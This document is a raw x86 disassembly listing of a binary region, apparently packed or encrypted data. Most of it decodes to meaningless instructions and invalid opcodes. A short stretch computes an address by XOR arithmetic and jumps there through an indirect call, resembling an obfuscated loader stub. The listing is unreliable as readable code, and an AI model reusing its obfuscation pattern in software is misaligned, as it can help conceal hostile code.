  40cac3:	aas    
  40cac4:	dec    esi
  40cac5:	shl    BYTE PTR [ebx+0x3866cd37],0xad
  40cacc:	(bad)  
  40cacd:	jmp    0x40cb0d
  40cacf:	idiv   DWORD PTR [edi+0x6915ba7]
  40cad5:	sub    al,0x0
  40cad7:	icebp  
  40cad8:	jo     0x40cacf
  40cada:	in     al,dx
  40cadb:	push   ebx
  40cadc:	pop    ss
  40cadd:	xchg   ebx,eax
  40cade:	mov    ah,0x98
  40cae0:	jns    0x40caa8
  40cae2:	inc    esi
  40cae3:	mov    al,0xf4
  40cae5:	in     eax,dx
  40cae6:	aam    0x86
  40cae8:	jmp    0x40cb10
  40caea:	ret    0xe19d
  40caed:	jmp    0x2398:0x5f0b846c
  40caf4:	sub    DWORD PTR [eax-0x1042d54e],edx
  40cafa:	xor    al,0x89
  40cafc:	pop    esi
  40cafd:	cmc    
  40cafe:	dec    ecx
  40caff:	dec    edi
  40cb00:	in     al,0xa6
  40cb02:	pusha  
  40cb03:	(bad)  
  40cb04:	out    dx,eax
  40cb05:	cli    
  40cb06:	jl     0x40ca92
  40cb08:	mov    eax,ds:0x1ce0ae99
  40cb0d:	scas   al,BYTE PTR es:[edi]
  40cb0e:	push   ds
  40cb0f:	mov    edi,DWORD PTR [ebp+ebp*1+0x7ec8200a]
  40cb16:	test   DWORD PTR [esi],ebx
  40cb18:	out    0x57,al
  40cb1a:	fmul   QWORD PTR [esi+0x7d]
  40cb1d:	sub    ebx,edx
  40cb1f:	sbb    DWORD PTR ds:0x8658de60,edi
  40cb25:	jns    0x40cad7
  40cb27:	sub    DWORD PTR [ebx+ebx*1+0x51],eax
  40cb2b:	xchg   esi,eax
  40cb2c:	es repnz neg ebp
  40cb30:	mov    ds:0xc944ee1e,al
  40cb36:	iret   
  40cb37:	ins    BYTE PTR es:[edi],dx
  40cb38:	arpl   WORD PTR [ecx+0x73],bp
  40cb3b:	ror    BYTE PTR [ebp-0x1f],0x4d
  40cb3f:	les    ebx,FWORD PTR [edi+eax*2+0x93167a8]
  40cb46:	in     eax,dx
  40cb47:	add    ah,BYTE PTR [edx-0x7c8ad1cb]
  40cb4d:	icebp  
  40cb4e:	xchg   ecx,eax
  40cb4f:	mov    ebp,0xa9d1cf06
  40cb54:	xchg   ebp,eax
  40cb55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb56:	add    BYTE PTR [esi-0x7f],ch
  40cb59:	sub    al,0xff
  40cb5b:	int    0x4
  40cb5d:	cmp    al,BYTE PTR ds:[esi+0x2222435]
  40cb64:	(bad)  
  40cb65:	xlat   BYTE PTR ds:[ebx]
  40cb66:	mov    BYTE PTR [edi-0x746984c],ch
  40cb6c:	sub    BYTE PTR ss:[edx-0x70ac746a],al
  40cb73:	ret    
  40cb74:	in     eax,0x6e
  40cb76:	sbb    bh,BYTE PTR [esi]
  40cb78:	aas    
  40cb79:	out    dx,al
  40cb7a:	test   DWORD PTR [edx-0x3a],eax
  40cb7d:	sub    edx,DWORD PTR [ebx+0x33]
  40cb80:	mov    bh,0x73
  40cb82:	pop    esp
  40cb83:	test   al,0xd1
  40cb85:	dec    esp
  40cb86:	mov    eax,ds:0x47062a7c
  40cb8b:	mov    al,ds:0x8fb85b13
  40cb90:	lods   al,BYTE PTR ds:[esi]
  40cb91:	or     eax,0xa250d6e1
  40cb96:	add    eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x11]
  40cbfc:	ror    dh,1
  40cbfe:	mov    WORD PTR [edx-0x74],fs
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	inc    ecx
  40cc08:	(bad)  
  40cc09:	mov    ds:0x2736601c,eax
  40cc0e:	popf   
  40cc0f:	dec    edi
  40cc10:	xor    ebx,esi
  40cc12:	mov    al,0x78
  40cc14:	adc    DWORD PTR [edi],edi
  40cc16:	int3   
  40cc17:	cs movhlps xmm5,xmm7
  40cc1b:	dec    edi
  40cc1c:	xchg   ecx,eax
  40cc1d:	jne    0x40cc40
  40cc1f:	bound  edx,QWORD PTR [eax-0x4f282d9a]
  40cc25:	loope  0x40cc9a
  40cc27:	ret    
  40cc28:	in     eax,dx
  40cc29:	addr16 and eax,0xf83f1d0d
  40cc2f:	dec    esp
  40cc30:	adc    BYTE PTR [edx+0x18156ce8],0x22
  40cc37:	icebp  
  40cc38:	jb     0x40cbfe
  40cc3a:	fadd   QWORD PTR [ebp+0x37c42696]
  40cc40:	xchg   edi,eax
  40cc41:	adc    BYTE PTR [eax-0x69],bh
  40cc44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc45:	call   0xc2c34467
  40cc4a:	push   eax
  40cc4b:	or     BYTE PTR [edi],bl
  40cc4d:	pop    es
  40cc4e:	and    ebp,ebp
  40cc50:	adc    esp,ebp
  40cc52:	test   al,0xed
  40cc54:	shr    edx,cl
  40cc56:	xchg   BYTE PTR [ebx+0x5f],dl
  40cc59:	inc    ecx
  40cc5a:	push   0x92a2deae
  40cc5f:	sbb    eax,0x2bec7323
  40cc64:	loope  0x40ccc0
  40cc66:	sahf   
  40cc67:	jg     0x40ccd5
  40cc69:	or     al,0x13
  40cc6b:	aad    0xd1
  40cc6d:	rcl    BYTE PTR [esi*2-0x467b184d],cl
  40cc74:	adc    ebx,edx
  40cc76:	inc    edx
  40cc77:	xchg   edx,eax
  40cc78:	sub    al,BYTE PTR [eax-0x1b8c0248]
  40cc7e:	and    ecx,DWORD PTR [edi*2+0x4f7bf363]
  40cc85:	xchg   edx,eax
  40cc86:	xchg   esp,eax
  40cc87:	push   esp
  40cc88:	sub    al,0x9d
  40cc8a:	arpl   WORD PTR [ebx],sp
  40cc8c:	js     0x40ccdc
  40cc8e:	pop    eax
  40cc8f:	dec    edi
  40cc90:	sub    DWORD PTR [esp+esi*1+0x5ce5f492],0xaf30dd3b
  40cc9b:	jg     0x40ccb4
  40cc9d:	mov    ebx,0x6c3f705a
  40cca2:	mov    bl,0xb3
  40cca4:	xlat   BYTE PTR ds:[ebx]
  40cca5:	cmp    BYTE PTR [ebp+edi*4-0x19],bl
  40cca9:	jp     0x40ccb7
  40ccab:	shl    DWORD PTR [ebp+0x4c],1
  40ccae:	sbb    eax,0xb8942423
  40ccb3:	popf   
  40ccb4:	jmp    0xa8e6:0xd244e79d
  40ccbb:	dec    edx
  40ccbc:	or     eax,0x4cd06796
  40ccc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccc2:	mov    BYTE PTR [edi+0x74e2c61e],ch
  40ccc8:	dec    ecx
  40ccc9:	xor    dh,ah
  40cccb:	xor    eax,0x4d07e55d
  40ccd0:	push   esp
  40ccd1:	fwait
  40ccd2:	pop    ss
  40ccd3:	adc    BYTE PTR [esi+0x13],0x85
  40ccd7:	adc    DWORD PTR [esi-0x57fcf8e4],ebp
  40ccdd:	push   0xffffff8a
  40ccdf:	mov    dl,0x50
  40cce1:	sub    DWORD PTR [esi+0x78],ebx
  40cce4:	js     0x40cce4
  40cce6:	leave  
  40cce7:	aaa    
  40cce8:	cmp    cl,dh
  40ccea:	and    ebx,DWORD PTR [eax+esi*2-0x71]
  40ccee:	ins    DWORD PTR es:[edi],dx
  40ccef:	pop    edi
  40ccf0:	jl     0x40cc8e
  40ccf2:	aaa    
  40ccf3:	stos   DWORD PTR es:[edi],eax
  40ccf4:	popf   
  40ccf5:	(bad)  
  40ccf6:	dec    ecx
  40ccf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccf8:	jecxz  0x40cce1
  40ccfa:	pop    edi
  40ccfb:	mov    bh,0x6b
  40ccfd:	cmp    eax,0xcb8faf3b
  40cd02:	test   eax,0x829425c4
  40cd07:	fdiv   DWORD PTR [ecx]
  40cd09:	and    DWORD PTR ds:0xdc4086e5,esi
  40cd0f:	sar    BYTE PTR [ecx+eiz*2+0x5343af8f],0xef
  40cd17:	jmp    0xcc578812
  40cd1c:	ret    
  40cd1d:	mov    bl,0xb4
  40cd1f:	scas   eax,DWORD PTR es:[edi]
  40cd20:	and    edx,DWORD PTR [edx-0x3b]
  40cd23:	mov    eax,ds:0xcc2f0c8d
  40cd28:	in     al,0xb0
  40cd2a:	dec    esi
  40cd2b:	pushf  
  40cd2c:	call   0xc1c5:0x9de15f36
  40cd33:	dec    esi
  40cd34:	mov    cl,0x11
  40cd36:	mov    al,ds:0xd674250b
  40cd3b:	stos   DWORD PTR es:[edi],eax
  40cd3c:	adc    cl,ch
  40cd3e:	push   0xffffffd6
  40cd40:	mov    eax,0xc1554628
  40cd45:	clc    
  40cd46:	mul    DWORD PTR ds:0xbd2c995
  40cd4c:	inc    esi
  40cd4d:	out    dx,eax
  40cd4e:	sbb    BYTE PTR [eax],0xe1
  40cd51:	adc    BYTE PTR [ebx-0x34],0x51
  40cd55:	inc    eax
  40cd56:	mov    ebp,0xaea588ac
  40cd5b:	or     bl,BYTE PTR [ebx+0xd]
  40cd5e:	cwde   
  40cd5f:	jl     0x40cdbc
  40cd61:	inc    ebp
  40cd62:	sub    al,0xd9
  40cd64:	push   cs
  40cd65:	cmp    edi,ecx
  40cd67:	mov    cl,0x83
  40cd69:	repnz sbb BYTE PTR [edi-0x55de8a0d],bh
  40cd70:	xchg   edi,eax
  40cd71:	loop   0x40cd75
  40cd73:	add    eax,eax
  40cd75:	es inc ecx
  40cd77:	sbb    al,ch
  40cd79:	dec    ebp
  40cd7a:	mov    dl,0x5f
  40cd7c:	jns    0x40cd28
  40cd7e:	add    ebp,DWORD PTR [ebp+0x26234af7]
  40cd84:	out    0xe,eax
  40cd86:	out    0xd2,al
  40cd88:	mov    bl,0xaa
  40cd8a:	mov    bl,BYTE PTR [ebx-0x317c9ca9]
  40cd90:	pop    eax
  40cd91:	jb     0x40cd79
  40cd93:	adc    ecx,DWORD PTR [esi+0x67]
  40cd96:	mov    ah,0x81
  40cd98:	imul   eax,DWORD PTR [eax+0x10426c1a],0xffffff91
  40cd9f:	das    
  40cda0:	test   DWORD PTR [eax],0xa05d805f
  40cda6:	(bad)  
  40cda7:	cmp    eax,0xf3f1d500
  40cdac:	xchg   ecx,eax
  40cdad:	mov    ebx,0x6ac4c95e
  40cdb2:	mov    ds:0x393c0929,eax
  40cdb7:	dec    ebx
  40cdb8:	nop
  40cdb9:	es sub eax,0x250db134
  40cdbf:	or     ebp,DWORD PTR [ebp+0x703f324b]
  40cdc5:	es out 0x49,al
  40cdc8:	ror    DWORD PTR [edi+ebp*1-0x69],1
  40cdcc:	mov    DWORD PTR [esi+0x77],eax
  40cdcf:	leave  
  40cdd0:	ja     0x40cda1
  40cdd2:	or     DWORD PTR [eax-0x72],ebp
  40cdd5:	sub    eax,0xd7c5c815
  40cdda:	fwait
  40cddb:	sbb    edi,DWORD PTR [edx]
  40cddd:	mov    ch,0xaa
  40cddf:	xchg   ebp,eax
  40cde0:	iret   
  40cde1:	retf   
  40cde2:	jp     0x40ce25
  40cde4:	popf   
  40cde5:	aas    
  40cde6:	add    eax,0x7f4a5ae
  40cdeb:	daa    
  40cdec:	sahf   
  40cded:	stos   BYTE PTR es:[edi],al
  40cdee:	scas   al,BYTE PTR es:[edi]
  40cdef:	mov    esi,0xe8b7e3af
  40cdf4:	pop    ss
  40cdf5:	mov    edi,0x487c83fa
  40cdfa:	jmp    0x128ed273
  40cdff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce00:	pop    es
  40ce01:	sub    BYTE PTR [esi],bh
  40ce03:	and    eax,0x33f5c6f2
  40ce08:	in     al,dx
  40ce09:	xlat   BYTE PTR ds:[ebx]
  40ce0a:	ds lods al,BYTE PTR ss:[esi]
  40ce0d:	mov    edx,0x39ee7dc9
  40ce12:	or     DWORD PTR [ebp-0x21],edx
  40ce15:	shr    edi,cl
  40ce17:	xlat   BYTE PTR es:[ebx]
  40ce19:	xchg   ebx,eax
  40ce1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce1b:	fimul  DWORD PTR [ecx+ecx*8+0x42]
  40ce1f:	pop    esi
  40ce20:	stc    
  40ce21:	mov    esi,0xd6e3da8b
  40ce26:	or     BYTE PTR [edi+edi*2+0x4b0ddd22],al
  40ce2d:	shl    DWORD PTR [edx],0xed
  40ce30:	daa    
  40ce31:	add    BYTE PTR [esp+esi*2],cl
  40ce34:	add    DWORD PTR [eax+0x72],esp
  40ce37:	adc    bh,BYTE PTR [edx]
  40ce39:	add    DWORD PTR [eax+0x2b],edi
  40ce3c:	or     dl,BYTE PTR [esi]
  40ce3e:	rol    bl,0x37
  40ce41:	mov    edx,0xb713dd8b
  40ce46:	outs   dx,DWORD PTR ds:[esi]
  40ce47:	iret   
  40ce48:	sbb    BYTE PTR [edi+0x2b057dd8],0xd9
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	and    al,0xd
  40ce64:	je     0x40ce18
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce6f:	dec    esp
  40ce70:	sub    al,0xa
  40ce72:	jg     0x40ce2a
  40ce74:	xor    eax,0xe065309d
  40ce79:	jnp    0x40ceab
  40ce7b:	retf   
  40ce7c:	adc    eax,0xba28b32d
  40ce81:	repz sbb al,0xdf
  40ce84:	stc    
  40ce85:	daa    
  40ce86:	dec    ecx
  40ce87:	and    eax,0x8d0681e7
  40ce8c:	arpl   ax,cx
  40ce8e:	mov    ch,dl
  40ce90:	les    edx,FWORD PTR [ecx+0x7774420d]
  40ce96:	rcl    DWORD PTR [ebp+0x6],1
  40ce99:	sub    eax,0x3b1cceef
  40ce9e:	nop
  40ce9f:	sbb    cl,ah
  40cea1:	dec    esp
  40cea2:	dec    eax
  40cea3:	shl    DWORD PTR [eax+0x27],0x8a
  40cea7:	enter  0xf900,0x71
  40ceab:	loop   0x40ce47
  40cead:	xor    BYTE PTR [edx+edx*1],ah
  40ceb0:	inc    edi
  40ceb1:	sub    eax,esp
  40ceb3:	cmp    al,0x37
  40ceb5:	mov    ebp,0xcd8366df
  40ceba:	pcmpgtd mm0,QWORD PTR ds:0x7bc2b448
  40cec1:	jle    0x40ce7e
  40cec3:	dec    eax
  40cec4:	sahf   
  40cec5:	imul   ebx,ecx,0x4c
  40cec8:	sbb    eax,0x97410cd8
  40cecd:	(bad)  
  40cece:	pop    eax
  40cecf:	cs cs push edx
  40ced2:	leave  
  40ced3:	addr16 mov ds,esi
  40ced6:	add    BYTE PTR [edi],ah
  40ced8:	xchg   BYTE PTR [eax-0x6e6b8356],al
  40cede:	ret    
  40cedf:	adc    BYTE PTR [ebx+0x49],dl
  40cee2:	push   ecx
  40cee3:	dec    esi
  40cee4:	addr16 leave 
  40cee6:	imul   DWORD PTR [ecx-0x346ef928]
  40ceec:	mov    bl,bh
  40ceee:	cdq    
  40ceef:	clc    
  40cef0:	cwde   
  40cef1:	jne    0x40cf3b
  40cef3:	ret    0x8f48
  40cef6:	sub    DWORD PTR ds:0x2e31ed8f,ebx
  40cefd:	shl    DWORD PTR [ebx-0x1c4c7add],cl
  40cf03:	mov    al,ds:0x42bc79ca
  40cf08:	xor    al,0x2d
  40cf0a:	mov    ds:0x30249c35,al
  40cf0f:	xchg   DWORD PTR [ecx+0x3ae7daaf],esi
  40cf15:	mov    edi,0xb7b13690
  40cf1a:	mov    WORD PTR [eax+0x1f],?
  40cf1d:	outs   dx,BYTE PTR ds:[esi]
  40cf1e:	cwde   
  40cf1f:	in     eax,0x32
  40cf21:	arpl   WORD PTR ds:0x3210852b,bp
  40cf27:	inc    ebx
  40cf28:	fstp   DWORD PTR [esi-0x19]
  40cf2b:	les    esi,FWORD PTR [edx]
  40cf2d:	push   es
  40cf2e:	mov    bh,0x9d
  40cf30:	inc    edx
  40cf31:	cmp    edi,ebp
  40cf33:	xor    dl,ch
  40cf35:	das    
  40cf36:	dec    esp
  40cf37:	push   0xd3fdaafa
  40cf3c:	adc    bh,bh
  40cf3e:	pop    edi
  40cf3f:	(bad)  
  40cf41:	sbb    ebp,DWORD PTR [ebx+0x71]
  40cf44:	rcr    DWORD PTR [eax],cl
  40cf46:	mov    ch,0x6d
  40cf48:	sbb    BYTE PTR [edx+0x247c96d8],0x91
  40cf4f:	cmp    ah,BYTE PTR [ebp+0x4b7bc48e]
  40cf55:	lea    edx,[esi-0x1bd31997]
  40cf5b:	in     al,dx
  40cf5c:	mov    al,0x81
  40cf5e:	scas   eax,DWORD PTR es:[edi]
  40cf5f:	inc    ecx
  40cf60:	add    cl,BYTE PTR es:[edi+0x71eb0d90]
  40cf67:	addr16 cmp al,0x1b
  40cf6a:	(bad)  
  40cf6b:	es in  al,0x26
  40cf6e:	mov    edx,0x29764bf
  40cf73:	test   BYTE PTR [ecx-0x5f7da753],bl
  40cf79:	icebp  
  40cf7a:	mov    eax,fs
  40cf7c:	mov    ds:0x74bae78d,al
  40cf81:	jle    0x40cf76
  40cf83:	cdq    
  40cf84:	push   ss
  40cf85:	(bad)  
  40cf86:	(bad)
  40cf8a:	xor    DWORD PTR [ebp-0x759d52ac],0xb
  40cf91:	inc    ecx
  40cf92:	stos   BYTE PTR es:[edi],al
  40cf93:	stc    
  40cf94:	pop    edi
  40cf95:	mov    bh,0x54
  40cf97:	xor    ebx,edi
  40cf99:	cs dec edx
  40cf9b:	jne    0x40cfda
  40cf9d:	pop    ebx
  40cf9e:	inc    esi
  40cf9f:	retf   
  40cfa0:	sahf   
  40cfa1:	cmp    eax,0xf5413b63
  40cfa6:	xchg   BYTE PTR [edi+ebx*1],al
  40cfa9:	shl    ebp,cl
  40cfab:	inc    eax
  40cfac:	xchg   ebx,eax
  40cfad:	outs   dx,DWORD PTR ds:[esi]
  40cfae:	imul   edi,DWORD PTR [edi],0xc3c7cd86
  40cfb4:	clc    
  40cfb5:	or     eax,0xe57fd194
  40cfba:	cmp    al,0xd
  40cfbc:	out    0xc,al
  40cfbe:	mov    BYTE PTR [ecx+eax*1-0x2b42b1df],dh
  40cfc5:	and    al,0x5b
  40cfc7:	mov    eax,0xb7f08bb6
  40cfcc:	pop    esi
  40cfcd:	outs   dx,DWORD PTR ds:[esi]
  40cfce:	dec    ebx
  40cfcf:	xchg   ebp,eax
  40cfd0:	ffree  st(6)
  40cfd2:	in     al,0xc1
  40cfd4:	adc    DWORD PTR [ecx+eiz*8+0x65],eax
  40cfd8:	push   0x7924a974
  40cfdd:	addr16 pop ecx
  40cfdf:	aas    
  40cfe0:	aaa    
  40cfe1:	fincstp 
  40cfe3:	jne    0x40cff2
  40cfe5:	scas   eax,DWORD PTR es:[edi]
  40cfe6:	xchg   ebx,eax
  40cfe7:	xor    eax,0x2017f053
  40cfec:	fadd   st(0),st
  40cfee:	popa   
  40cfef:	(bad)  
  40cff0:	mov    bl,0xa5
  40cff2:	sti    
  40cff3:	(bad)  
  40cff4:	iret   
  40cff5:	shr    DWORD PTR [edx+0x9],0x51
  40cff9:	and    esp,DWORD PTR [ebp+0x61]
  40cffc:	into   
  40cffd:	push   ecx
  40cffe:	ins    DWORD PTR es:[edi],dx
  40cfff:	rcl    ebx,cl
  40d001:	fdiv   QWORD PTR [esi-0x247bed93]
  40d007:	jmp    0x9a91f213
  40d00c:	pushf  
  40d00d:	pop    ebp
  40d00e:	xor    eax,0xe764b291
  40d013:	push   edx
  40d014:	xchg   ecx,eax
  40d015:	pusha  
  40d016:	mov    eax,ds:0x5a9a951c
  40d01b:	adc    al,0x65
  40d01d:	cmp    esp,edx
  40d01f:	and    al,0x2e
  40d021:	push   edi
  40d022:	adc    eax,0xd14fc0a9
  40d027:	mov    esp,0xddc0c098
  40d02c:	xchg   DWORD PTR ds:0x7d9b08b4,edi
  40d032:	add    al,BYTE PTR [ebp-0x25]
  40d035:	repz or ah,BYTE PTR [esi-0x4bf59ed3]
  40d03c:	in     al,0xc3
  40d03e:	xchg   edi,eax
  40d03f:	jmp    0x40d011
  40d041:	sbb    BYTE PTR [edx-0x32],cl
  40d044:	fwait
  40d045:	mov    bl,0x79
  40d047:	xchg   edx,eax
  40d048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d049:	popf   
  40d04a:	push   es
  40d04b:	gs scas eax,DWORD PTR es:[edi]
  40d04d:	test   edi,esp
  40d04f:	fwait
  40d050:	popf   
  40d051:	lock je 0x40d0ca
  40d054:	hlt    
  40d055:	bound  esp,QWORD PTR [esi+eiz*8-0xc189840]
  40d05c:	int    0xf6
  40d05e:	inc    esi
  40d05f:	lahf   
  40d060:	jnp    0x40d00b
  40d062:	add    DWORD PTR [edi+0x63ceb5be],esi
  40d068:	cs addr16 inc esi
  40d06b:	repz ss popa 
  40d06e:	fwait
  40d06f:	mov    DWORD PTR ds:0x130e9d48,ebx
  40d075:	pusha  
  40d076:	hlt    
  40d077:	mov    bl,0x53
  40d079:	in     al,dx
  40d07a:	pop    esp
  40d07b:	jp     0x40d0ba
  40d07d:	mov    eax,ds:0xbde9dc4f
  40d082:	sahf   
  40d083:	inc    edi
  40d084:	mov    ds:0xdd0e7643,eax
  40d089:	push   ss
  40d08a:	imul   edx,DWORD PTR [edi+0x42],0xd289df06
  40d091:	cmp    BYTE PTR [esi+0x543da476],ah
  40d097:	mov    ds:0x4172899,eax
  40d09c:	(bad)  
  40d09d:	or     eax,0xda361ef3
  40d0a2:	scas   al,BYTE PTR es:[edi]
  40d0a3:	lods   al,BYTE PTR ds:[esi]
  40d0a4:	push   edi
  40d0a5:	aad    0x86
  40d0a7:	inc    edx
  40d0a8:	neg    bl
  40d0aa:	mov    bl,0x9c
  40d0ac:	mov    ch,0xe
  40d0ae:	xchg   edi,eax
  40d0af:	pop    esi
  40d0b0:	stos   DWORD PTR es:[edi],eax
  40d0b1:	es cmp ebp,edi
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0d0:	inc    ebx
  40d0d1:	es (bad) 
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d0bb
  40d0dc:	fild   WORD PTR [ecx-0x3016be05]
  40d0e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0e3:	xchg   ebp,eax
  40d0e4:	mov    ds:0xe5a6475f,al
  40d0e9:	push   ds
  40d0ea:	pop    ss
  40d0eb:	imul   eax,DWORD PTR [ebx+esi*2-0x3b],0xc176232a
  40d0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0f4:	sub    cl,BYTE PTR [ecx+0x4b7cd0eb]
  40d0fa:	push   0x63
  40d0fc:	xchg   BYTE PTR [edx],al
  40d0fe:	retf   0x895c
  40d101:	add    al,0xbf
  40d103:	retf   
  40d104:	mov    ch,0xa4
  40d106:	add    al,0xa7
  40d108:	sbb    al,0x89
  40d10a:	adc    dl,cl
  40d10c:	add    BYTE PTR [esi],bl
  40d10e:	in     al,0xc7
  40d110:	ss mov ch,0xbd
  40d113:	pusha  
  40d114:	jae    0x40d116
  40d116:	or     DWORD PTR ds:0x8fe91e9,esp
  40d11c:	loop   0x40d113
  40d11e:	sar    BYTE PTR [eax],0xfe
  40d121:	xchg   ecx,eax
  40d122:	in     al,dx
  40d123:	jb     0x40d167
  40d125:	and    al,0xdb
  40d127:	jmp    0xfd29aee7
  40d12c:	in     al,0xb
  40d12e:	mov    dh,0x51
  40d130:	lock (bad) [ecx-0x1d57c147]
  40d137:	pop    esp
  40d138:	pop    ebp
  40d139:	sub    DWORD PTR [esi+0x1b],ecx
  40d13c:	and    eax,0x414da2a1
  40d141:	adc    BYTE PTR [eax+esi*2+0x13],0x69
  40d146:	mov    cl,ah
  40d148:	mov    bh,0xff
  40d14a:	and    BYTE PTR ds:0x5ca82832,ch
  40d150:	scas   al,BYTE PTR es:[edi]
  40d151:	(bad)  
  40d152:	and    DWORD PTR [eax-0x7a79df86],ebx
  40d158:	cmp    bl,dl
  40d15a:	pop    ebp
  40d15b:	cwde   
  40d15c:	adc    BYTE PTR [ecx],bh
  40d15e:	push   es
  40d15f:	test   al,0x6f
  40d161:	(bad)  
  40d162:	mov    edx,0x4b961415
  40d167:	in     eax,dx
  40d168:	stc    
  40d169:	jno    0x40d1cd
  40d16b:	div    DWORD PTR [ebx+edi*8-0x25]
  40d16f:	lds    esi,FWORD PTR [ebx]
  40d171:	and    BYTE PTR [eax],0xa
  40d174:	mov    WORD PTR [eax-0x26],?
  40d177:	cmp    BYTE PTR [edi],dh
  40d179:	ds mov esp,0x8126d9b4
  40d17f:	cmp    DWORD PTR [ebx+edx*2-0x477177d5],edi
  40d186:	mov    bh,0x2e
  40d188:	ret    
  40d189:	fs xor esi,0xffffff83
  40d18d:	aaa    
  40d18e:	and    bl,BYTE PTR [ebx+0x1a]
  40d191:	aad    0xc
  40d193:	inc    esi
  40d194:	and    BYTE PTR [esi],0x41
  40d197:	popa   
  40d198:	pop    edx
  40d199:	shr    DWORD PTR [eax],1
  40d19b:	cmp    esi,eax
  40d19d:	pop    edx
  40d19e:	cmova  ebx,DWORD PTR [esi-0x2e]
  40d1a2:	mov    eax,0x85cec1a8
  40d1a7:	in     eax,0xc1
  40d1a9:	je     0x40d177
  40d1ab:	popa   
  40d1ac:	jmp    0x54f8:0x1e188e1e
  40d1b3:	ins    BYTE PTR es:[edi],dx
  40d1b4:	jbe    0x40d17b
  40d1b6:	je     0x40d179
  40d1b8:	sbb    ah,0xc4
  40d1bb:	loopne 0x40d224
  40d1bd:	and    BYTE PTR ds:0x65ea7d11,ch
  40d1c3:	pop    eax
  40d1c4:	push   eax
  40d1c5:	mov    ah,0x10
  40d1c7:	aaa    
  40d1c8:	mov    ecx,0x17e9c9d2
  40d1cd:	ss pusha 
  40d1cf:	(bad)  
  40d1d0:	cmp    eax,0x8b62d8c3
  40d1d5:	adc    ebp,DWORD PTR [edi]
  40d1d7:	mov    edi,0x233e33e7
  40d1dc:	sbb    bl,0x5b
  40d1df:	leave  
  40d1e0:	mov    ebx,0x8fa07edc
  40d1e5:	rcl    DWORD PTR [eax],1
  40d1e7:	jge    0x40d203
  40d1e9:	aad    0x8b
  40d1eb:	mov    DWORD PTR [esi],edi
  40d1ed:	add    eax,0xd2b36958
  40d1f2:	mov    bl,0x3c
  40d1f4:	repnz mov ds:0x88f230fd,al
  40d1fa:	dec    ebx
  40d1fb:	sbb    al,0x2b
  40d1fd:	inc    edi
  40d1fe:	out    0x77,al
  40d200:	mov    al,0xf2
  40d202:	and    BYTE PTR [eax-0x1de0d713],ah
  40d208:	retf   
  40d209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d20a:	sbb    ch,BYTE PTR [edx+ebx*8+0x5e]
  40d20e:	stos   BYTE PTR es:[edi],al
  40d20f:	dec    esi
  40d210:	cli    
  40d211:	clc    
  40d212:	pusha  
  40d213:	cmp    BYTE PTR [esi+0xddc4259],dh
  40d219:	dec    ecx
  40d21a:	(bad)  [edi-0x69]
  40d21d:	push   esi
  40d21e:	stc    
  40d21f:	popa   
  40d220:	sub    ch,BYTE PTR [ebp+0x36d78b51]
  40d226:	scas   al,BYTE PTR es:[edi]
  40d227:	jae    0x40d279
  40d229:	mov    eax,0xede92402
  40d22e:	dec    esi
  40d22f:	pushf  
  40d230:	js     0x40d28b
  40d232:	outs   dx,DWORD PTR ds:[esi]
  40d233:	sbb    eax,0xc337e31b
  40d238:	inc    eax
  40d239:	test   WORD PTR [ebx],0x93c5
  40d23e:	jmp    0x6fea:0x4fd3dab5
  40d245:	jae    0x40d2ae
  40d247:	loope  0x40d2a8
  40d249:	nop
  40d24a:	aaa    
